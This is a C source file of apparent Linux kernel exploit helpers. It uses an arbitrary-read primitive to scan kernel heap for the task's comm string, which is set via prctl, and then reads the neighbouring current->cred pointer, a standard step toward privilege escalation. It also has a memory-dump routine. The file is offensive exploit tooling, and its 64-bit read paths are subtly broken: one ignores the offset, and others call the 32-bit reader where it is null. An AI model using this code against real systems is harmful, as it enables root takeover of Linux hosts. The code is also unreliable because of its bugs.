#include <assert.h>
#define prctl_mm_map prctl_mm_map_conflict
#include <linux/prctl.h>
#undef prctl_mm_map
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/prctl.h>

#include "util.h"

static bool found_target(void *const addr, void *const target, const uint64_t len,
                         uint32_t (*aar32)(void *), uint64_t (*aar64)(void *)) {
    if (aar32 != NULL) {
        for (uint64_t offset = 0; offset < len; offset += 4) {
            uint32_t actual;
            uint32_t expect;
            if (offset + 4 < len) {
                actual = aar32(addr + offset);
                expect = *(uint32_t *)(target + offset);
            } else {
                uint64_t rest = len - offset;
                actual = aar32(addr + offset);
                expect = (*(uint32_t *)(target + offset)) & ((1 << (8 * rest)) - 1);
            }
            if (actual != expect) {
                return false;
            }
        }
        return true;
    }
    if (aar64 != NULL) {
        for (uint64_t offset = 0; offset < len; offset += 8) {
            uint64_t actual;
            uint64_t expect;
            if (offset + 8 < len) {
                actual = aar64(addr);
                expect = *(uint64_t *)(target + offset);
            } else {
                uint64_t rest = len - offset;
                actual = aar32(addr);
                expect = (*(uint64_t *)(target + offset)) & ((1 << (8 * rest)) - 1);
            }
            if (actual != expect) {
                return false;
            }
        }
        return true;
    }
    return false;
}

void *find_target_from_heap(void *const addr_start, void *const target, const uint64_t len,
                            uint32_t (*aar32)(void *), uint64_t (*aar64)(void *)) {
    uint64_t addr;
    if (aar32 != NULL) {
        for (addr = (uint64_t)addr_start;; addr += 8) {
            if ((addr & 0xffff) == 0) {
                printf("      searching %p...\n", (void *)addr);
            }
            if (found_target((void *)addr, target, len, aar32, NULL)) {
                printf("[+] found target at %p\n", (void *)addr);
                return (void *)addr;
            }
        }
    }
    if (aar64 != NULL) {
        for (addr = (uint64_t)addr_start;; addr += 8) {
            if ((addr & 0xffff) == 0) {
                printf("      searching %p...\n", (void *)addr);
            }
            if (found_target((void *)addr, target, len, NULL, aar64)) {
                printf("[+] found target at %p\n", (void *)addr);
                return (void *)addr;
            }
        }
    }
    puts("[-] please implement aar function");
    return NULL;
}

void *find_comm(void *const addr_start, uint32_t (*aar32)(void *), uint64_t (*aar64)(void *)) {
    char name[] = "maimai";
    assert(sizeof(name) <= 16);
    if (prctl(PR_SET_NAME, name) == -1) {
        fatal("prctl");
    }
    printf("[ ] start searching comm from %p\n", addr_start);
    return find_target_from_heap(addr_start, name, sizeof(name), aar32, aar64);
}

void *comm_to_addr_cred(void *addr_comm, uint32_t (*aar32)(void *), uint64_t (*aar64)(void *)) {
    uint64_t addr_cred = 0;
    if (aar32 != NULL) {
        addr_cred |= aar32(addr_comm - 8);
        addr_cred |= (uint64_t)aar32(addr_comm - 4) << 32;
        printf("[+] current->cred at %p\n", (void *)addr_cred);
    } else if (aar64 != NULL) {
        addr_cred |= aar64(addr_comm - 8);
        printf("[+] current->cred at %p\n", (void *)addr_cred);
    } else {
        puts("[-] please implement aar function");
    }
    return (void *)addr_cred;
}

void dump_buffer_aar(void *addr_start, const uint64_t row, uint32_t (*aar32)(void *),
                     uint64_t (*aar64)(void *)) {
    printf("[ ] buffer dump by aar from %p\n", addr_start);
    if (aar32 != NULL) {
        for (uint64_t i = 0; i < row; i++) {
            uint64_t val = 0;
            val |= aar32(addr_start + i * 8);
            val |= (uint64_t)aar32(addr_start + i * 8 + 4) << 32;
            printf("      %p|+0x%02lx: 0x%016lx\n", addr_start + i * 8, i * 8, val);
        }
    } else if (aar64 != NULL) {
        for (uint64_t i = 0; i < row; i++) {
            uint64_t val = aar32(addr_start + i * 8);
            printf("      %p|+0x%02lx: 0x%016lx\n", addr_start + i * 8, i * 8, val);
        }
    } else {
        puts("[-] please implement aar function");
    }
}
